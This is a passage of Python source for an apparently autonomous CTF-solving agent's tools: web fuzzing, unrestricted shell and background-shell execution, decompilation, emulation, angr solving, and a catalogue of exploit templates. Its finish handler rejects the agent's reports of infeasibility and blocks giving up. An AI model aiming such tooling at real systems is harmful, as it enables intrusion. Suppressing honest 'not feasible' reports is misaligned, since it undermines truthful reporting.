            f"Headers: {dict(r.headers)}\n\n"
            f"Body snippet:\n{body}"
        )
        if trimmed:
            result += f"\n... [Truncated. Use shell_exec to grep/tail {dump_path} to read the rest.]"
            
        if flag_hits:
            result += f"\n\n[!] FLAG-LIKE STRINGS FOUND: {flag_hits}"
            
        return result
    except Exception as e:
        return f"[error] {e}"


def _ffuf_fuzz(
    url: str,
    wordlist: str = None,
    extensions: str = None,
    filter_code: str = "404",
) -> str:
    """Run ffuf web fuzzer."""
    # Quick reachability check — avoid fuzzing a silent/unreachable host and
    # returning misleading results (e.g. cached JSON from a previous run).
    import urllib.parse, socket
    try:
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        sock = socket.create_connection((host, port), timeout=5)
        sock.close()
    except (OSError, socket.timeout) as e:
        return (
            f"[ffuf SKIPPED] Target {url} is unreachable ({e}). "
            "Cannot fuzz an offline host. Check VPN/routing or call ask_human."
        )

    wl = wordlist or "/usr/share/wordlists/dirb/common.txt"
    if not Path(wl).exists():
        wl = "/usr/share/dirb/wordlists/common.txt"
    ext_flag = f"-e {extensions}" if extensions else ""
    fc_flag = f"-fc {filter_code}" if filter_code else ""
    cmd = f"ffuf -u '{url}' -w '{wl}' {ext_flag} {fc_flag} -t 50 -timeout 10 -o /tmp/ffuf_out.json -of json 2>&1 | tail -30"
    result = _shell_exec(cmd, timeout=60)
    # Also parse JSON output for clean summary
    try:
        import json
        data = json.loads(Path("/tmp/ffuf_out.json").read_text())
        results = data.get("results", [])
        if results:
            summary = "\n".join(
                f"  [{r['status']}] /{r['input'].get('FUZZ','')}  ({r['length']} bytes)"
                for r in results[:30]
            )
            return f"[ffuf] Found {len(results)} paths:\n{summary}"
    except Exception:
        pass
    return result


def _think(reasoning: str, session) -> str:
    if session:
        return session.add_thought(reasoning)
    return "[think] Reasoning noted (no session)."


def _finish(args: dict, session) -> str:
    flag = args.get("flag", "NOT_FOUND")
    report = args.get("report", "")

    # Gate: only reject NOT_FOUND, never reject a real flag
    if flag in ("NOT_FOUND", "NOT_FOUND\n", ""):
        if session:
            n_failures = len(session.failed_methods)
            has_attack_tree = "get_attack_tree" in session.tools_used
            has_thought = bool(session.thoughts)

            issues = []
            if n_failures < MIN_FAILURES_BEFORE_GIVING_UP:
                issues.append(
                    f"only {n_failures}/{MIN_FAILURES_BEFORE_GIVING_UP} distinct approaches tried"
                )
            if not has_attack_tree:
                issues.append("get_attack_tree() not called yet")
            if not has_thought:
                issues.append("think() not called yet")

            if issues:
                action_hint = []
                if n_failures < MIN_FAILURES_BEFORE_GIVING_UP:
                    need = MIN_FAILURES_BEFORE_GIVING_UP - n_failures
                    action_hint.append(
                        f"You must call note_failure(method, reason) for each distinct approach "
                        f"you have already tried ({need} more needed). "
                        f"Example: note_failure('jwt_alg_none', 'Server returned 401 for alg:none token')"
                    )
                if not has_attack_tree:
                    action_hint.append("Call get_attack_tree(category) to see all remaining options.")
                if not has_thought:
                    action_hint.append("Call think() to reason about untried approaches.")
                return (
                    f"[FINISH REJECTED] You cannot give up yet: {'; '.join(issues)}. "
                    + " ".join(action_hint)
                )

        # Also reject if the report contains give-up / unfeasibility language
        _GIVEUP_PHRASES = (
            "not feasible",
            "tool constraints",
            "cannot be done through this interface",
            "fully reconstructing",
            "isn't feasible",
            "not possible in this environment",
            "unable to proceed",
        )
        report_lower = report.lower()
        hit = next((p for p in _GIVEUP_PHRASES if p in report_lower), None)
        if hit:
            return (
                f"[FINISH REJECTED] Your report contains a give-up phrase: '{hit}'. "
                "This is not a valid reason to stop. You have angr_solve, r2_analyze, "
                "ghidra_analyze, shell_exec — there is always another approach. "
                "Call think() and try something you haven't tried yet."
            )

    return f"[finish] Flag: {flag}"


def _search_writeups(query: str, category: str = None, top_k: int = 3, exclude_terms: str = None) -> str:
    from ctf_rag.retriever import retrieve_techniques
    lines = []

    # Layer 2: abstract techniques — highest signal, shown first
    techniques = retrieve_techniques(query=query, category=category, top_k=2)
    if techniques:
        lines.append(f"## Learned Techniques ({len(techniques)} match(es))\n")
        for t in techniques:
            code_note = " [has reusable code]" if t["reusable_code"].strip() else ""
            lines.append(
                f"**{t['technique_name']}** ({t['category']}, similarity={1 - t['distance']:.2f}){code_note}\n"
                f"  Recognition:\n{t['recognition']}\n"
                f"  Steps:\n{t['steps']}\n"
                + (f"  Code:\n```python\n{t['reusable_code'][:6000]}\n```\n" if t["reusable_code"].strip() else "")
                + (f"  Caveats: {t['caveats']}\n" if t["caveats"] else "")
            )
        lines.append("")

    # Layer 1: raw writeup instances
    # For long queries (challenge descriptions), use multi-query retrieval:
    # split on "/" or "," to create alternate phrasings that each embed cleanly.
    if len(query) > 200:
        # Generate 2-3 focused sub-queries from the full description
        import re as _re
        sentences = _re.split(r'[.\n]', query)
        sub_queries = [s.strip() for s in sentences if len(s.strip()) > 20][:3]
        if len(sub_queries) >= 2:
            results = retrieve_multi(
                queries=[query] + sub_queries,
                category=category,
                top_k=top_k,
            )
        else:
            results = retrieve(query=query, category=category, top_k=top_k, exclude_terms=exclude_terms)
    else:
        results = retrieve(query=query, category=category, top_k=top_k, exclude_terms=exclude_terms)

    if results:
        lines.append(f"## Writeup Instances ({len(results)} match(es))\n")
        for i, r in enumerate(results, 1):
            lines.append(
                f"[{i}] **{r['title']}** ({r['category']}, similarity={1 - r['distance']:.2f})\n"
                f"   Tools: {r['tools']}\n"
                f"   Key Insight: {r['key_insight']}\n"
                f"   Solution: {r['solution'][:10000]}{'...' if len(r['solution']) > 10000 else ''}\n"
            )

    if not lines:
        return (
            "No matching writeups or techniques found. "
            "Try get_attack_tree() for a systematic checklist, or broaden your query."
        )
    return "\n".join(lines)


def _get_attack_tree(category: str) -> str:
    from ctf_rag.attack_trees import get_attack_tree
    base = get_attack_tree(category)

    # Append any learned techniques for this category from Layer 2
    try:
        from ctf_rag.retriever import retrieve_techniques
        techniques = retrieve_techniques(query=category, category=category, top_k=5)
        if techniques:
            learned_lines = ["\n\n## Learned Techniques (from past solves)"]
            for t in techniques:
                code_note = " [template available via get_template]" if t["reusable_code"].strip() else ""
                learned_lines.append(
                    f"\n**{t['technique_name']}**{code_note}\n"
                    f"  Recognition: {t['recognition'].replace(chr(10), ' | ')}\n"
                    f"  Steps: {t['steps'][:300]}"
                )
            base += "\n".join(learned_lines)
    except Exception:
        pass

    return base


def _get_template(template: str) -> str:
    template_map = {
        # Crypto
        "crypto_rsa":             "data/templates/crypto_rsa.py",
        "crypto_franklin_reiter": "data/templates/crypto_franklin_reiter.py",
        "crypto_rsa_advanced":    "data/templates/crypto_rsa_advanced.py",
        "crypto_z3":              "data/templates/crypto_z3.py",
        "crypto_ecc":             "data/templates/crypto_ecc.py",
        # Pwn — Stack
        "pwn_ret2libc":           "data/templates/pwn_ret2libc.py",
        "pwn_format_string":      "data/templates/pwn_format_string.py",
        "pwn_rop_libc":           "data/templates/pwn_rop_libc.py",
        # Pwn — Heap
        "pwn_heap_tcache":        "data/templates/pwn_heap_tcache.py",
        "pwn_io_file":            "data/templates/pwn_io_file.py",
        # Pwn — Kernel
        "pwn_kernel_rop":         "data/templates/pwn_kernel_rop.py",
        # Pwn — Advanced ROP
        "pwn_srop":               "data/templates/pwn_srop.py",
        "pwn_ret2csu":            "data/templates/pwn_ret2csu.py",
        "pwn_format_string_advanced": "data/templates/pwn_format_string_advanced.py",
        # Pwn — Race
        "pwn_race_condition":     "data/templates/pwn_race_condition.py",
        # Rev
        "rev_angr":               "data/templates/rev_angr.py",
        "rev_brute_numeric":      "data/templates/rev_brute_numeric.py",
        # Web
        "web_jwt_forge":          "data/templates/web_jwt_forge.py",
        "web_sqli":               "data/templates/web_sqli.py",
        # Forensics
        "forensics_recon":        "data/templates/forensics_recon.sh",
        "forensics_multitool":    "data/templates/forensics_multitool.py",
    }
    # Also include any auto-saved templates (e.g. rev_elf_packer_xor_memfd.py)
    auto_tpl_dir = Path("data/templates")
    if auto_tpl_dir.exists():
        for p in auto_tpl_dir.glob("*.py"):
            key = p.stem  # filename without extension
            if key not in template_map:
                template_map[key] = str(p)

    path = template_map.get(template)
    if not path:
        return f"[error] Unknown template '{template}'. Available: {sorted(template_map)}"
    try:
        return Path(path).read_text(encoding="utf-8")
    except FileNotFoundError:
        return f"[error] Template file not found: {path}"


def _bg_shell(action: str, shell_id: str, command: str = "",
              timeout: int = 2, stdin_input: str = "") -> str:
    """
    Manage background shells.
    action='start' : spawn command in background, buffer output via a reader thread.
    action='read'  : return buffered output collected so far (non-blocking).
    action='kill'  : terminate the process and remove from registry.
    """
    global _BG_SHELLS

    if action == "start":
        if not command:
            return "[bg_shell error] 'command' is required for action='start'."
        if shell_id in _BG_SHELLS:
            _bg_shell("kill", shell_id)  # replace existing

        stdin_bytes = stdin_input.encode() if stdin_input else None
        proc = subprocess.Popen(
            ["bash", "-c", command],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.PIPE if stdin_bytes else subprocess.DEVNULL,
        )
        if stdin_bytes:
            try:
                proc.stdin.write(stdin_bytes)
                proc.stdin.flush()
                proc.stdin.close()
            except Exception:
                pass

        buf: list[str] = []
        buf_lock = threading.Lock()

        def _reader():
            try:
                for line in proc.stdout:
                    with buf_lock:
                        buf.append(line.decode("utf-8", errors="replace"))
                        if len(buf) > 2000:
                            buf.pop(0)  # rolling window
            except Exception:
                pass

        t = threading.Thread(target=_reader, daemon=True)
        t.start()

        _BG_SHELLS[shell_id] = {"proc": proc, "buf": buf, "lock": buf_lock, "thread": t}
        return (
            f"[bg_shell] '{shell_id}' started (pid={proc.pid}).\n"
            f"  Command: {command}\n"
            f"  Use bg_shell(action='read', shell_id='{shell_id}') to poll output.\n"
            f"  Use bg_shell(action='kill', shell_id='{shell_id}') when done."
        )

    elif action == "read":
        if shell_id not in _BG_SHELLS:
            ids = list(_BG_SHELLS.keys())
            return f"[bg_shell error] No shell '{shell_id}'. Active shells: {ids}"
        entry = _BG_SHELLS[shell_id]
        proc  = entry["proc"]
        buf   = entry["buf"]
        lock  = entry["lock"]

        # Wait briefly for new output if timeout > 0
        import time as _t
        deadline = _t.time() + timeout
        while _t.time() < deadline:
            with lock:
                if buf:
                    break
            _t.sleep(0.1)

        with lock:
            captured = "".join(buf)
            buf.clear()

        rc = proc.poll()
        status = f"[running pid={proc.pid}]" if rc is None else f"[exited rc={rc}]"
        if not captured:
            return f"[bg_shell '{shell_id}'] {status} — no new output yet."
        # Cap output to keep context window sane
        if len(captured) > 8000:
            captured = captured[-8000:]
            captured = "[...truncated...]\n" + captured
        return f"[bg_shell '{shell_id}'] {status}\n{captured}"

    elif action == "kill":
        if shell_id not in _BG_SHELLS:
            return f"[bg_shell] No shell '{shell_id}' to kill."
        entry = _BG_SHELLS.pop(shell_id)
        proc  = entry["proc"]
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
        return f"[bg_shell] '{shell_id}' killed."

    else:
        return f"[bg_shell error] Unknown action '{action}'. Use 'start', 'read', or 'kill'."


def _shell_exec(command: str, timeout: int = 30, stdin_input: str = "") -> str:
    import os as _os
    timeout = min(int(timeout), 120)
    stdin_bytes = stdin_input.encode("utf-8") if stdin_input else None
    
    # Inject agent_skills to PYTHONPATH so agent's scripts can import them natively
    env = _os.environ.copy()
    epaths = env.get("PYTHONPATH", "")
    spaths = "/home/work/ctf-tool-enset/data"
    env["PYTHONPATH"] = f"{epaths}:{spaths}" if epaths else spaths
    
    # Always prepend CWD so the agent knows what base path relative names resolve to.
    cwd = _os.getcwd()
    try:
        # Run under bash (not /bin/sh) so <<< herestrings and bashisms work.
        # Capture as bytes so binary output (FTP, hex dumps, binaries) never causes a codec error.
        result = subprocess.run(
            ["bash", "-c", command], capture_output=True, timeout=timeout,
            input=stdin_bytes, env=env
        )
        stdout = result.stdout.decode("utf-8", errors="replace") if result.stdout else ""
        stderr = result.stderr.decode("utf-8", errors="replace") if result.stderr else ""
        parts = [f"[CWD: {cwd}]  ← ALL relative paths below resolve from here; use absolute paths to avoid confusion"]
        if stdout:
            stdout_str = stdout[-30000:] if len(stdout) > 30000 else stdout
            parts.append(f"[stdout]\n{stdout_str}")
        if stderr:
            stderr_str = stderr[-30000:] if len(stderr) > 30000 else stderr
            parts.append(f"[stderr]\n{stderr_str}")
        if result.returncode != 0:
            parts.append(f"[SCRIPT FAILED — exit code {result.returncode}]")
            if not stdout and not stderr:
                parts.append("[no stdout/stderr captured — possible interpreter crash or missing imports]")
        else:
            if not stdout and not stderr:
                parts.append("[exit 0 — script ran but produced no output]")
            else:
                parts.append(f"[exit {result.returncode}]")
        return "\n".join(parts)
    except subprocess.TimeoutExpired as e:
        parts = [f"[error] Timed out after {timeout}s"]
        if hasattr(e, 'stdout') and e.stdout:
            stdout_raw = e.stdout.decode("utf-8", errors="replace") if isinstance(e.stdout, bytes) else str(e.stdout)
            stdout_str = stdout_raw[-30000:] if len(stdout_raw) > 30000 else stdout_raw
            parts.append(f"[stdout before timeout]\n{stdout_str}")
        if hasattr(e, 'stderr') and e.stderr:
            stderr_raw = e.stderr.decode("utf-8", errors="replace") if isinstance(e.stderr, bytes) else str(e.stderr)
            stderr_str = stderr_raw[-30000:] if len(stderr_raw) > 30000 else stderr_raw
            parts.append(f"[stderr before timeout]\n{stderr_str}")
        return "\n".join(parts)
    except Exception as e:
        return f"[error] {e}"


def _read_file(path: str, binary: bool = False) -> str:
    try:
        p = Path(path)
        if not p.exists():
            return f"[error] Not found: {path}"
        if binary:
            raw = p.read_bytes()[:512]
            lines = []
            for i in range(0, len(raw), 16):
                chunk = raw[i:i + 16]
                hex_part = " ".join(f"{b:02x}" for b in chunk)
                ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
                lines.append(f"{i:04x}  {hex_part:<48}  {ascii_part}")
            return "\n".join(lines)
        content = p.read_text(encoding="utf-8", errors="replace")
        if len(content) > 30000:
            content = content[:30000] + f"\n... [truncated, {len(content)} chars total]"
        return content
    except Exception as e:
        return f"[error] {e}"


def _write_file(path: str, content: str) -> str:
    try:
        p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
        return f"[ok] Written {len(content)} chars to {path}"
    except Exception as e:
        return f"[error] {e}"

def _ask_human(question: str) -> str:
    """Pause execution and ask the human user in the terminal."""
    from rich.console import Console
    console = Console()
    console.print(f"\n[bold magenta]🤔 Agent asks you:[/bold magenta] {question}")
    try:
        answer = console.input("[bold magenta]Your reply:[/bold magenta] ")
        return f"[Human says] {answer}"
    except (KeyboardInterrupt, EOFError):
        return "[Human aborted the input]"


# --- Advanced Tools Phase 8 ---

def _browser_exec(url: str, js_script: str) -> str:
    """Executes playwright via python subprocess boundary."""
    import base64
    safe_js = base64.b64encode(js_script.encode("utf-8")).decode("utf-8")
    cmd = f"""/home/work/pw_venv/bin/python /home/work/ctf-tool-enset/ctf_rag/browser_harness.py "{url}" "$(echo '{safe_js}' | base64 -d)" """
    return _shell_exec(cmd, timeout=30)

def _decompile_function(binary: str, func_name: str) -> str:
    """Uses r2ghidra to extract C pseudo-code. Falls back to disassembly if decompilation unavailable."""
    # Try r2ghidra first
    cmd = f'r2 -A -q -e scr.color=0 -c "pdg @ {func_name}; q" "{binary}" 2>/dev/null'
    out = _shell_exec(cmd, timeout=20)
    
    if out.strip() and "Cannot find" not in out and "error" not in out.lower():
        return f"[C Pseudo-code for {func_name}]\n{out}"
    
    # Fallback to disassembly if pdg fails
    cmd = f'r2 -A -q -e scr.color=0 -c "pdf @ {func_name}; q" "{binary}" 2>/dev/null'
    out = _shell_exec(cmd, timeout=20)
    
    if out.strip():
        return f"[Disassembly for {func_name}]\n{out}"
    
    return "[error] Decompilation failed. Function not found or binary may be packed/obfuscated."

def _unicorn_emulate(
    binary: str,
    func_addr: str,
    func_size: int = 512,
    arch: str = "",
    regs: dict = None,
    max_insn: int = 500,
    stack_data: str = "",
) -> str:
    """
    Emulate a single function in isolation using Unicorn.
    Loads the ELF segment containing func_addr into Unicorn memory,
    sets up a fake stack, initialises registers from `regs`, and runs.
    Returns final register values + any memory writes near the result registers.
    """
    script = f'''
import sys, struct
from pathlib import Path

binary = {repr(binary)}
func_addr = int({repr(func_addr)}, 16) if isinstance({repr(func_addr)}, str) else {repr(func_addr)}
func_size = {func_size}
max_insn = {max_insn}
arch_hint = {repr(arch.lower())}
regs_init = {repr(regs or {})}
stack_data_hex = {repr(stack_data)}

# --- Parse ELF to find segments ---
data = Path(binary).read_bytes()

# Detect arch from ELF header if not specified
e_machine = struct.unpack_from("<H", data, 0x12)[0]
e_flags   = struct.unpack_from("<I", data, 0x24)[0]
if not arch_hint:
    if e_machine == 0x28:   arch_hint = "arm_thumb" if (e_flags & 0x200) else "arm"
    elif e_machine == 0xb7: arch_hint = "aarch64"
    elif e_machine == 0x3e: arch_hint = "x86_64"
    elif e_machine == 0x03: arch_hint = "x86"
    else: arch_hint = "x86_64"

import unicorn as uc
import unicorn.arm_const as arm_c
import unicorn.x86_const as x86_c

ARCH_MAP = {{
    "arm":     (uc.UC_ARCH_ARM,  uc.UC_MODE_ARM),
    "arm_thumb":(uc.UC_ARCH_ARM, uc.UC_MODE_THUMB),
    "aarch64": (uc.UC_ARCH_ARM64,uc.UC_MODE_ARM),
    "x86":     (uc.UC_ARCH_X86,  uc.UC_MODE_32),
    "x86_64":  (uc.UC_ARCH_X86,  uc.UC_MODE_64),
}}
arch_uc, mode_uc = ARCH_MAP.get(arch_hint, ARCH_MAP["x86_64"])
mu = uc.Uc(arch_uc, mode_uc)

# Parse PT_LOAD segments and map them
e_phoff   = struct.unpack_from("<I" if data[4]==1 else "<Q", data, 0x1c if data[4]==1 else 0x20)[0]
e_phentsize = struct.unpack_from("<H", data, 0x2a if data[4]==1 else 0x36)[0]
e_phnum   = struct.unpack_from("<H", data, 0x2c if data[4]==1 else 0x38)[0]
PAGE = 0x1000
mapped = []
for i in range(e_phnum):
    off = e_phoff + i * e_phentsize
    p_type = struct.unpack_from("<I", data, off)[0]
    if p_type != 1: continue  # PT_LOAD
    if data[4] == 1:  # 32-bit ELF: p_type p_offset p_vaddr p_paddr p_filesz p_memsz ...
        p_offset, p_vaddr, _, p_filesz, p_memsz = struct.unpack_from("<IIIII", data, off+4)
    else:             # 64-bit ELF: p_type p_flags p_offset p_vaddr p_paddr p_filesz p_memsz p_align
        vals = struct.unpack_from("<QQQQQQ", data, off+8)  # 6 × 8-byte fields from off+8
        p_offset, p_vaddr, _, p_filesz, p_memsz = vals[0], vals[1], vals[2], vals[3], vals[4]
    base = p_vaddr & ~(PAGE-1)
    end  = (p_vaddr + p_memsz + PAGE - 1) & ~(PAGE-1)
    if end <= base: end = base + PAGE
    try:
        mu.mem_map(base, end - base)
        chunk = data[p_offset:p_offset+p_filesz]
        mu.mem_write(p_vaddr, chunk)
        mapped.append((base, end))
    except Exception as ex:
        pass  # already mapped overlapping region

# Map stack
STACK_BASE = 0x7fff0000
STACK_SIZE = 0x10000
mu.mem_map(STACK_BASE, STACK_SIZE)
SP = STACK_BASE + STACK_SIZE - 0x100
if stack_data_hex:
    mu.mem_write(SP, bytes.fromhex(stack_data_hex))

# Set up registers
ARM_REGS = {{
    "r0":arm_c.UC_ARM_REG_R0,"r1":arm_c.UC_ARM_REG_R1,
    "r2":arm_c.UC_ARM_REG_R2,"r3":arm_c.UC_ARM_REG_R3,
    "r4":arm_c.UC_ARM_REG_R4,"r5":arm_c.UC_ARM_REG_R5,
    "r6":arm_c.UC_ARM_REG_R6,"r7":arm_c.UC_ARM_REG_R7,
    "r8":arm_c.UC_ARM_REG_R8,"r9":arm_c.UC_ARM_REG_R9,
    "r10":arm_c.UC_ARM_REG_R10,"r11":arm_c.UC_ARM_REG_R11,
    "r12":arm_c.UC_ARM_REG_R12,"sp":arm_c.UC_ARM_REG_SP,
    "lr":arm_c.UC_ARM_REG_LR,"pc":arm_c.UC_ARM_REG_PC,
}}
X86_64_REGS = {{
    "rax":x86_c.UC_X86_REG_RAX,"rbx":x86_c.UC_X86_REG_RBX,
    "rcx":x86_c.UC_X86_REG_RCX,"rdx":x86_c.UC_X86_REG_RDX,
    "rsi":x86_c.UC_X86_REG_RSI,"rdi":x86_c.UC_X86_REG_RDI,
    "rsp":x86_c.UC_X86_REG_RSP,"rbp":x86_c.UC_X86_REG_RBP,
    "r8":x86_c.UC_X86_REG_R8,"r9":x86_c.UC_X86_REG_R9,
    "rip":x86_c.UC_X86_REG_RIP,
}}

reg_map = ARM_REGS if arch_hint.startswith("arm") else X86_64_REGS
sp_reg  = reg_map.get("sp", reg_map.get("rsp"))
if sp_reg: mu.reg_write(sp_reg, SP)

# Set LR to a trap address so the function returns cleanly
trap_addr = 0xdeadbeec
if arch_hint.startswith("arm"):
    mu.reg_write(arm_c.UC_ARM_REG_LR, trap_addr)

for rname, rval in regs_init.items():
    rid = reg_map.get(rname.lower())
    if rid: mu.reg_write(rid, int(rval))

# Run
start = func_addr
if arch_hint == "arm_thumb": start |= 1
try:
    mu.emu_start(start, trap_addr, timeout=5_000_000, count=max_insn)
except uc.UcError as e:
    # Expected: INSN_INVALID at trap_addr (ret hit our trap) or normal stop
    pass

# Dump result registers
print(f"[unicorn] arch={{arch_hint}} func={{hex(func_addr)}}")
print("Registers after emulation:")
for rname, rid in list(reg_map.items())[:10]:
    try:
        val = mu.reg_read(rid)
        print(f"  {{rname:4s}} = {{hex(val)}} ({{val}})")
    except: pass
'''
    return _shell_exec(f"python3 - <<'PYEOF'\n{script}\nPYEOF", timeout=30)


def _qemu_gdb(
    binary: str,
    gdb_cmds: list,
    rootfs: str = "",
    stdin_input: str = "",
    arch_qemu: str = "arm",
    timeout: int = 30,
) -> str:
    """
    Dynamic ARM/MIPS analysis via qemu-user tracing (syscalls + executed instructions).
    Note: gdb-multiarch is not installed, so GDB-style breakpoints are not available.
    Instead this runs the binary with qemu tracing enabled:
      - strace mode: shows all syscall arguments and return values
      - asm trace: logs all executed ARM instructions to a file, returns last N lines
    gdb_cmds is reinterpreted as trace_modes: list of strings from
      ["strace", "asm", "exec", "cpu"]
    Example: qemu_gdb(binary=..., gdb_cmds=["strace"], stdin_input="2\\n000000\\n")
    """
    import textwrap

    rootfs_flag = f"-L {rootfs}" if rootfs else ""
    qemu_bin = f"qemu-{arch_qemu}"
    trace_log = "/tmp/_ctf_qemu_trace.txt"

    # Interpret gdb_cmds as trace modes
    modes = gdb_cmds if gdb_cmds else ["strace"]
    use_strace = any("strace" in m for m in modes)
    debug_flags = [m for m in modes if m in ("in_asm", "exec", "cpu", "asm")]
    if "asm" in debug_flags:
        debug_flags = [m.replace("asm", "in_asm") for m in debug_flags]

    strace_flag = "-strace" if use_strace else ""
    debug_flag = f"-d {','.join(debug_flags)} -D {trace_log}" if debug_flags else ""

    if stdin_input:
        escaped = stdin_input.replace("'", "'\"'\"'")
        stdin_setup = f"printf '{escaped}' > /tmp/_ctf_qgdb_stdin.txt"
        redir = "< /tmp/_ctf_qgdb_stdin.txt"
    else:
        stdin_setup = "true"
        redir = "< /dev/null"

    # For strace-only mode, capture stderr (where strace output goes)
    if use_strace and not debug_flags:
        cmd = f"{stdin_setup} && {qemu_bin} {strace_flag} {rootfs_flag} \"{binary}\" {redir} 2>&1 | head -200"
        return _shell_exec(cmd, timeout=timeout)

    # For asm trace: write to file, then tail the file
    shell = textwrap.dedent(f"""\
        rm -f {trace_log}
        {stdin_setup}
        {qemu_bin} {strace_flag} {debug_flag} {rootfs_flag} "{binary}" {redir} 2>&1 | head -100
        if [ -f {trace_log} ]; then
            echo "--- ARM instruction trace (last 100 lines) ---"
            tail -100 {trace_log}
        fi
    """)
    return _shell_exec(shell, timeout=timeout)


def _gdb_analyze(binary: str, payload: str) -> str:
    import shlex as _shlex
    from pathlib import Path
    Path("/tmp/gdb_payload.txt").write_text(payload)
    binary_q = _shlex.quote(binary)
    cmd = f'gdb -q -nw -ex "run < /tmp/gdb_payload.txt" -ex "info registers" -ex "backtrace" -ex "quit" {binary_q}'
    return _shell_exec(cmd, timeout=20)

def _find_gadget(binary: str, regex: str) -> str:
    import shlex as _shlex
    binary_q = _shlex.quote(binary)
    cmd = f'ropper -f {binary_q} --search "{regex}" --nocolor'
    return _shell_exec(cmd, timeout=30)

def _angr_solve(
    binary: str,
    find_addr: str = "",
    avoid_addr: str = "",
    find_str: str = "",
    avoid_str: str = "",
    flag_length: int = 40,
    arch: str = "",
    session=None,
) -> str:
    """
    Symbolic execution — string mode (preferred) or address mode.
    Uses veritesting to handle path explosion and step-based exploration
    with an automatic fallback from veritesting → standard → constrained.
    """
    if not find_str and not find_addr:
        return "[error] angr_solve requires at least find_str or find_addr."

    arch_arg = f", main_opts={{'arch': '{arch}'}}" if arch else ""

    if find_str:
        find_bytes = find_str.encode().hex()
        avoid_bytes = avoid_str.encode().hex() if avoid_str else ""
        avoid_clause = (
            f"avoid=lambda s: bytes.fromhex('{avoid_bytes}') in s.posix.dumps(1),"
            if avoid_bytes else ""
        )
        script = f'''\
import angr, claripy, sys, signal

TIMEOUT = 120  # seconds per attempt

def _solve_with_config(use_veritesting: bool, max_active: int) -> bytes | None:
    p = angr.Project("{binary}", auto_load_libs=False{arch_arg})
    flag = claripy.BVS("flag", {flag_length} * 8)
    stdin = angr.SimFile("/dev/stdin", content=flag, size={flag_length})
    opts = {{angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
             angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS}}
    if use_veritesting:
        opts.add(angr.options.VERITESTING)
    state = p.factory.full_init_state(stdin=stdin, add_options=opts)
    for i in range({flag_length}):
        b = flag.get_byte(i)
        state.solver.add(b >= 0x20, b <= 0x7e)
    sm = p.factory.simulation_manager(state)

    def _step_hook(sm):
        """Prune to max_active states to prevent path explosion."""
        if len(sm.active) > max_active:
            # Keep the most constrained states (most bytes solved)
            ranked = sorted(sm.active,
                key=lambda s: s.solver.constraints.__len__(), reverse=True)
            sm.active = ranked[:max_active]
            sm._stashes["pruned"] = sm._stashes.get("pruned", []) + ranked[max_active:]
        return sm

    find_fn = lambda s: bytes.fromhex("{find_bytes}") in s.posix.dumps(1)
    {("avoid_fn = lambda s: bytes.fromhex('" + avoid_bytes + "') in s.posix.dumps(1)") if avoid_bytes else "avoid_fn = None"}
    kwargs = {{"find": find_fn}}
    if avoid_fn:
        kwargs["avoid"] = avoid_fn
    if max_active < 256:
        kwargs["step_func"] = _step_hook

    sm.explore(**kwargs)
    if sm.found:
        return sm.found[0].solver.eval(flag, cast_to=bytes)
    return None

print(f"[angr] Attempting symbolic execution on {binary!r}, flag_length={flag_length}")

# Attempt 1: veritesting (best for loops/merging) with generous state budget
try:
    print("[angr] Strategy 1: veritesting=True, max_active=512")
    sol = _solve_with_config(use_veritesting=True, max_active=512)
    if sol:
        print("[FOUND]", sol)
        print("[STRING]", sol.decode("utf-8", errors="replace"))
        sys.exit(0)
    print("[angr] Strategy 1 found no path.")
except Exception as e:
    print(f"[angr] Strategy 1 error: {{e}}")

# Attempt 2: standard explore with path pruning
try:
    print("[angr] Strategy 2: standard explore, max_active=64")
    sol = _solve_with_config(use_veritesting=False, max_active=64)
    if sol:
        print("[FOUND]", sol)
        print("[STRING]", sol.decode("utf-8", errors="replace"))
        sys.exit(0)
    print("[angr] Strategy 2 found no path.")
except Exception as e:
    print(f"[angr] Strategy 2 error: {{e}}")

# Attempt 3: tight constraints (printable ASCII only, length hint ±4)
try:
    print("[angr] Strategy 3: tight constraints (shorter flag_length)")
    p = angr.Project("{binary}", auto_load_libs=False{arch_arg})
    shorter = max(8, {flag_length} - 8)
    flag = claripy.BVS("flag", shorter * 8)
    stdin = angr.SimFile("/dev/stdin", content=flag, size=shorter)
    state = p.factory.full_init_state(
        stdin=stdin,
        add_options={{angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                     angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
                     angr.options.VERITESTING}},
    )
    for i in range(shorter):
        b = flag.get_byte(i)
        state.solver.add(b >= 0x20, b <= 0x7e)
    sm = p.factory.simulation_manager(state)
    sm.explore(find=lambda s: bytes.fromhex("{find_bytes}") in s.posix.dumps(1))
    if sm.found:
        sol = sm.found[0].solver.eval(flag, cast_to=bytes)
        print("[FOUND]", sol)
        print("[STRING]", sol.decode("utf-8", errors="replace"))
        sys.exit(0)
except Exception as e:
    print(f"[angr] Strategy 3 error: {{e}}")

print("[ERROR] All angr strategies exhausted — no path found.")
print("Suggestions:")
print("  1. Increase flag_length (current: {flag_length})")
print("  2. Use find_addr (exact address) instead of find_str")
print("  3. Try unicorn_emulate for function-level emulation (faster for small functions)")
print("  4. Use ltrace_run — flags often leak in strcmp/memcmp without symbolic execution")
'''
    else:
        # Address mode — direct find/avoid by address
        avoid_clause = (
            f"avoid=int('{avoid_addr}', 16)," if avoid_addr else ""
        )
        script = f'''\
import angr, claripy, sys

def _solve(use_veritesting: bool, max_active: int) -> bytes | None:
    p = angr.Project("{binary}", auto_load_libs=False{arch_arg})
    flag = claripy.BVS("flag", {flag_length} * 8)
    stdin = angr.SimFile("/dev/stdin", content=flag, size={flag_length})
    opts = {{angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
             angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS}}
    if use_veritesting:
        opts.add(angr.options.VERITESTING)
    state = p.factory.full_init_state(stdin=stdin, add_options=opts)
    for i in range({flag_length}):
        b = flag.get_byte(i)
        state.solver.add(b >= 0x20, b <= 0x7e)
    sm = p.factory.simulation_manager(state)

    if max_active < 256:
        def _prune(sm):
            if len(sm.active) > max_active:
                ranked = sorted(sm.active,
